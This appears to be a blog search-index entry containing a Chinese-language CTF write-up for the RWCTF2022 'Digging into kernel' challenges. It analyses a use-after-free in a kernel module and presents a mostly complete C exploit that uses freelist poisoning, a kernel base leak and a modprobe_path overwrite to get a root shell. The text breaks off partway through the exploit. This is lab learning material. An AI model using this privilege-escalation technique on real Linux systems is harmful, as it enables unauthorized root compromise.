<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RWCTF2022高校赛 - Digging into kernel 1 &amp; 2</title>
      <link href="/2024/03/22/RWCTF2022%E9%AB%98%E6%A0%A1%E8%B5%9B%20-%20Digging%20into%20kernel%201%20&amp;%202/"/>
      <url>/2024/03/22/RWCTF2022%E9%AB%98%E6%A0%A1%E8%B5%9B%20-%20Digging%20into%20kernel%201%20&amp;%202/</url>
      
        <content type="html"><![CDATA[<h1 id="Digging-into-kernel"><a href="#Digging-into-kernel" class="headerlink" title="Digging into kernel"></a>Digging into kernel</h1><p>启动脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep,+smap <span class="token punctuation">\</span>    <span class="token parameter variable">--nographic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题启动脚本中没有把 monitor 设置为 null，题目可以直接不用看了，先按 <code>ctrl + A</code> 然后按 <code>C</code> 然后 enter 就能进入 qemu 的 monitor 模式直接拿 flag</p><h1 id="Digging-into-kernel-2"><a href="#Digging-into-kernel-2" class="headerlink" title="Digging into kernel 2"></a>Digging into kernel 2</h1><p>这一题和上一题其实完全一样，只是修复了启动脚本中 monitor 的漏洞</p><h2 id="一、逆向分析"><a href="#一、逆向分析" class="headerlink" title="一、逆向分析"></a>一、逆向分析</h2><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><p>（出题人把kaslr写成kalsr，我还说调试的时候为啥关不掉，淦）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 <span class="token punctuation">\</span><span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span><span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span><span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kaslr"</span> <span class="token punctuation">\</span><span class="token parameter variable">-cpu</span> kvm64,+smep,+smap <span class="token punctuation">\</span><span class="token parameter variable">-monitor</span> null <span class="token punctuation">\</span><span class="token parameter variable">--nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开了kaslr、smep、smap</p><p>经过实验也开了kpti</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/home $ <span class="token function">cat</span> /sys/devices/system/cpu/vulnerabilities/meltdown                       │Mitigation: PTI  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="rcS"><a href="#rcS" class="headerlink" title="rcS"></a>rcS</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">chown</span> <span class="token parameter variable">-R</span> <span class="token number">0</span>:0 /<span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs none /dev<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrictinsmod /xkmod.ko<span class="token function">chmod</span> <span class="token number">644</span> /dev/xkmod<span class="token function">chmod</span> <span class="token number">600</span> /flag<span class="token function">chmod</span> <span class="token number">600</span> /etc/init.d/rcS<span class="token function">mkdir</span> home <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> home<span class="token function">chown</span> <span class="token parameter variable">-R</span> <span class="token number">1000</span>:1000 <span class="token builtin class-name">.</span><span class="token builtin class-name">echo</span> <span class="token string">"-------------------------------------------"</span><span class="token builtin class-name">echo</span> <span class="token string">"|                                         |"</span><span class="token builtin class-name">echo</span> <span class="token string">"| |~~\|  |  | /~~~~|~~|~~  /~\ /~~\/~\/|  |"</span><span class="token builtin class-name">echo</span> <span class="token string">"| |__/|  |  ||     |  |--   ,/|    |,/ |  |"</span><span class="token builtin class-name">echo</span> <span class="token string">"| |__/|  |  ||     |  |--   ,/|    |,/ |  |"</span><span class="token builtin class-name">echo</span> <span class="token string">"| |  \ \/ \/  \__  |  |    /__ \__//___|_ |"</span><span class="token builtin class-name">echo</span> <span class="token string">"|                                         |"</span><span class="token builtin class-name">echo</span> <span class="token string">"-------------------------------------------"</span><span class="token comment">#poweroff -d 120 -f &amp;</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span>poweroff <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="xkmod-ko"><a href="#xkmod-ko" class="headerlink" title="xkmod.ko"></a>xkmod.ko</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        Canary found      NX disabled   REL             No RPATH   No RUNPATH   60) Symbols  No00./rootfs/xkmod.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开了canary</p><p>创建了一个混杂设备“xkmod”<br><img src="/EXP_FILE/a2edc15f46848921d4fcf5f07e8a8272_MD5.jpeg"></p><p>在模块载入时会创建一个名为“lalala”的cache，object是0xc0，后面三参都为0，由于没有设置 SLAB_ACCOUNT 标志位故该 kmem_cache 会默认与 kmalloc-192 合并</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">xkmod_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  kmem_cache <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1E4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">misc_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>xkmod_device<span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token punctuation">(</span>kmem_cache <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_create</span><span class="token punctuation">(</span><span class="token string">"lalala"</span><span class="token punctuation">,</span> <span class="token number">192LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> v0<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ioctl实现了分配、编辑、读取的功能，并且全都没有上锁</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">xkmod_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">0x6666666</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">&amp;&amp;</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x50</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">&lt;=</span> <span class="token number">0x70</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// set</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">0x7777777</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">0x1111111</span> <span class="token punctuation">)</span>          buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">3264LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// add</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">&amp;&amp;</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x50</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">&lt;=</span> <span class="token number">0x70</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">xkmod_ioctl_cold</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过分析，传入的结构体应为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> offset<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在关闭设备时会释放掉buf，但没有置空，存在cache的UAF</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">xkmod_release</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">kmem_cache_free</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、利用思路"><a href="#二、利用思路" class="headerlink" title="二、利用思路"></a>二、利用思路</h2><p>同时打开两个设备就能实现UAF，甚至不需要ioctl未上锁的漏洞</p><ol><li>实现内核任意地址写<br>freelist 随机化保护并非是一个运行时保护，而是在为 slub 分配页面时会将页面内的 object 指针随机打乱，<strong>但是在后面的分配释放中依然遵循着LIFO的原则</strong>。</li></ol><p>我们可以先获得一个 object 的 UAF，修改其 next 为我们想要分配的地址，之后我们连续进行两次分配便能够成功获得目标地址上的 object ，实现任意地址读写。</p><p>不过需要注意的是，当我们分配到目标地址时<strong>目标地址前 8 字节的数据会被写入 freelist，而这通常并非一个有效的地址</strong>，从而导致 kernel panic。我们应当尽量选取目标地址往前的一个有着 8 字节 0 的区域，从而使得 freelist 获得一个 NULL 指针，促使 kmem_cache 向 buddy system 请求一个新的 slub，这样就不会发生 crash。</p><ol start="2"><li>泄露内核基址<br>接下来我们考虑如何泄露内核基址，在内核“堆基址”（page_offset_base） + 0x9d000 处存放着 <code>secondary_startup_64</code> 函数的地址。我们可以从 free object 的 next 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 <code>堆基址 + 0x9d000</code> 处的 object 以泄露内核基址<br><img src="/EXP_FILE/c4f5ab23f1217b0d487747a84e7241b1_MD5.jpeg"></li></ol><p>通过调试，开启kaslr后，page_fault_base由<code>0xffff888000000000 -&gt; 0xffffa2f540000000</code>，我们截取前9位</p><ol start="3"><li>劫持内核执行流<br>我选择覆写 <code>modprobe_path</code> 从而以 root 执行getflag程序</li></ol><h2 id="三、EXP"><a href="#三、EXP" class="headerlink" title="三、EXP"></a>三、EXP</h2><h3 id="EXP-modprobe-path"><a href="#EXP-modprobe-path" class="headerlink" title="EXP-modprobe_path"></a>EXP-modprobe_path</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0x7777777</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0x6666666</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0x1111111</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MODPROBE_PATH</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xffffffff82444700</span><span class="token operator">+</span>koff<span class="token punctuation">)</span></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> offset<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">;</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* to run the exp on the specific core only */</span><span class="token keyword">void</span> <span class="token function">bindCore</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set cpu affinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_ADD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> offset<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>req<span class="token punctuation">.</span>offset <span class="token operator">=</span> offset<span class="token punctuation">;</span>req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_SET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> offset<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>req<span class="token punctuation">.</span>offset <span class="token operator">=</span> offset<span class="token punctuation">;</span>req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_GET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bindCore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* UAF1 */</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] ------UAF1------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/xkmod"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd1<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev1 Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/xkmod"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd2<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev2 Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[-] Dev1 Closed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">get</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>leak <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">;</span><span class="token class-name">size_t</span> kheap <span class="token operator">=</span> leak <span class="token operator">&amp;</span> <span class="token number">0xfffffffff0000000</span> <span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] kheap => 0x%lx\n"</span><span class="token punctuation">,</span> kheap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> kheap<span class="token operator">+</span><span class="token number">0x9d000</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">;</span><span class="token comment">//next->0xffff888005e529c0</span><span class="token function">set</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">get</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>leak <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>leak<span class="token operator">&amp;</span><span class="token number">0xffffffff00000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token 